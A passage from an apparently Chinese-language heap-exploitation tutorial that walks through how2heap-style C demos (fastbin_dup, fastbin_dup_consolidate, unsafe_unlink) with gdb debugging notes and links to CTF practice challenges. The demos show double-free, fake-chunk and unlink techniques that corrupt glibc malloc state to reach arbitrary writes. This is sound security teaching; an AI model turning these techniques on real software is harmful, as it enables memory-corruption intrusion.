E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu16.04编译，然后使用pwncli改写rpath。
</code></pre>
<h3 id="调试-3"><a href="#调试-3" class="headerlink" title="调试"></a>调试</h3><p>初始化堆。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922091755981-1695348432658-25.png"
                      alt="image-20230922091755981"
                ></p>
<p>在<code>0x400703</code>处下断点查看堆结构。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922091916522-1695348571707-28.png"
                     
                ><br>栈中数组结构。<code>fake_chunks_size = 0x40</code>，<code>fake_chunks_next_size = 0x1234</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092146583-1695348610428-32.png"
                      alt="image-20230922092146583"
                ><br>将 <code>a</code> 指向<code>fake_chunks_fd</code>，然后 <code>free(a)</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092342656-1695348634598-36.png"
                      alt="image-20230922092342656"
                ><br>成功将栈地址放入 <code>fastbins</code> 中。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092506302-1695348654255-39.png"
                      alt="image-20230922092506302"
                ><br>那麽此时申请0x30大小的空间会在fastbins中寻找0x40大小的chunk，便可成功申请到栈上。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092715145-1695348671021-42.png"
                      alt="image-20230922092715145"
                ></p>
<h1 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h1><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><ul>
<li>fast bin attack<br>例题1：<a class="link"   href="https://www.52pojie.cn/thread-1817311-1-1.html" >0CTF2017:babyheap <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>unsafe unlink<br>例题2：<a class="link"   href="https://www.52pojie.cn//thread-1820017-1-1.html" >HITCON CTF 2016 : Secret Holdr <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>例题3：<a class="link"   href="https://www.52pojie.cn/thread-1825577-1-1.html" >HITCON CTF 2016 : SleepyHolder <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">	a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-4"><a href="#调试-4" class="headerlink" title="调试"></a>调试</h3><p>使用ubuntu:16.04编译，<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XWR593Z6QWM678A.png"
                     
                ><br>然后使用pwncli修改运行环境。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_HFXM6UD3SRQFGMH.png"
                      alt="图片描述"
                ><br>malloc三次相同大小的堆块后，在0x400700下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2EGACEX74TU3QRY.png"
                      alt="图片描述"
                ><br>观察堆结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_24PJANS2GM8MB2P.png"
                      alt="图片描述"
                ><br>依次释放堆块a,b后，在0x4007CF下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_A2SCWXK32FJK626.png"
                      alt="图片描述"
                ><br>观察fastbin结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_5KFTD8D4QBYUZRY.png"
                      alt="图片描述"
                ><br>再次释放a,形成double free后，在0x4007F8下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JZ24RST96TR5RPJ.png"
                      alt="图片描述"
                ><br>观察fastbin结构，已经形成ABA结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_782YNCGZFNYW8QR.png"
                      alt="图片描述"
                ><br>此时依次申请a,b,c三个相应大小的堆块，将会依次摘出a,b,a,<br>fastbin中a-&gt;b-&gt;a-&gt;b…这条链子会一直存在，不断从头部取出相应大小的堆块。<br>申请a后，在0x400835下断点（rax保存了_malloc函数的返回值）。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_QA4NT4K533CQDKZ.png"
                      alt="图片描述"
                ><br>此时fastbin结构，形成了BAB结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YRGPNNXAJD7C2F9.png"
                      alt="图片描述"
                ><br>同样，申请完b后在0x400843下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PTP2U3KSVCT74TK.png"
                      alt="图片描述"
                ><br>此时fastbin结构，又形成了ABA结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_J4CQ4CJAZSCH7WU.png"
                      alt="图片描述"
                ><br>同样申请完c后在0x400851下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CR3CMBC9VJWUDT3.png"
                      alt="图片描述"
                ><br>此时fastbin结构，再次形成BAB结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KSXPFGVAYV5H9YZ.png"
                      alt="图片描述"
                ><br>此时a和c指向同一地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_J4MZWDG2C8F3WEA.png"
                      alt="图片描述"
                ></p>
<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><h3 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">// reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;This is a powerful technique that bypasses the double free check in tcachebin.&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up the tcache list to force the fastbin usage...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocate another chunk of the same size p1=%p \n&quot;</span>, p1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing p1 will add this chunk to the fastbin list...\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating a tcache-sized chunk (p3=%p)\n&quot;</span>, p3);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;will trigger the malloc_consolidate and merge\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the fastbin chunks into the top chunk, thus\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p1 and p3 are now pointing to the same chunk !\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(p1 == p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Triggering the double free vulnerability!\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(p4 == p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The double free added the chunk referenced by p1 \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;to the tcache thus the next similar-size malloc will\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;point to p3: p3=%p, p4=%p\n\n&quot;</span>,p3, p4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu:16.04编译并使用pwncli改写rpath。
</code></pre>
<h3 id="调试-5"><a href="#调试-5" class="headerlink" title="调试"></a>调试</h3><p>calloc p1堆块后，在0x4006C5处下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KQEQ32B3NMRVFSC.png"
                      alt="图片描述"
                ><br>查看堆结构， 可以看到多出来一块0x411大小的堆块。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4PVC2FBRWP9GF7A.png"
                      alt="图片描述"
                ><br>这个堆块是puts的缓冲区。puts函数用于将字符串输出到标准输出流（stdout），而标准输出流是一个文件流，需要在内存中分配一块缓冲区来存储输出的字符串，下图是其分配过程。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XG85YQF9NY28T7S.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6QS2Z3FCJEQPXMR.png"
                      alt="图片描述"
                ><br>free(p1)后，p1会优先进入fastbins。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YG6FJ2KF3VB4U26.png"
                      alt="图片描述"
                ><br>再次申请0x400（实际大小为0x410）的chunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_Y7DJTKGEFQFGFGA.png"
                      alt="图片描述"
                ><br>在gdb里s步入调试，可以看到触发了malloc_consolidate机制。原因如下，因为libc再分配large chunk时，fastbin中有p1这个chunk存在，所以会调用malloc_consolidate()函数整合fastbins中的chunk，并放入unsorted bin或top_chunk;然后unsorted bin中的chunk又会被取出放入各自对应的bins。(这个bins为small bin和large bin。这也是chunk唯一进入small bin和large bin的机会)。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VXYWCAM8E85E5V6.png"
                      alt="图片描述"
                ><br>malloc_consolidate()函数执行完以后，因为p1与top_chunk相邻，所以p1被合并到了top_chunk。top_chunk的基址也变成了p1的prev_size的地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6AUFTSRX2JMSNHZ.png"
                      alt="图片描述"
                ><br>然后malloc函数会从top_chunk获取chunk，那么p1的地址就已经和p3指向同一块地址了。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7R2MJEDKJDC62ZD.png"
                      alt="图片描述"
                ><br>此时再次free(p1)，在0x40076c处下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3UFBHGTKF3NW24D.png"
                      alt="图片描述"
                ><br>由于p1和p3指向同一个大小为0x411的chunk,而这个chunk又和top_chunk相邻，所以会再次被合并到top_chunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_K9CV7KXXVU9UMNW.png"
                      alt="图片描述"
                ><br>如果这个时候，我们再次申请一个chunk，在0x40077A处下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_38SFMRQ5X3FR7A5.png"
                      alt="图片描述"
                ><br>那么这个chunk的地址还会与p1 &amp;&amp; p3的地址一样。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4AUY3TB9B4HUMEM.png"
                      alt="图片描述"
                ><br>至此p1,p3,p4指向了同一块chunk。</p>
<h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h2><h3 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">	<span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span 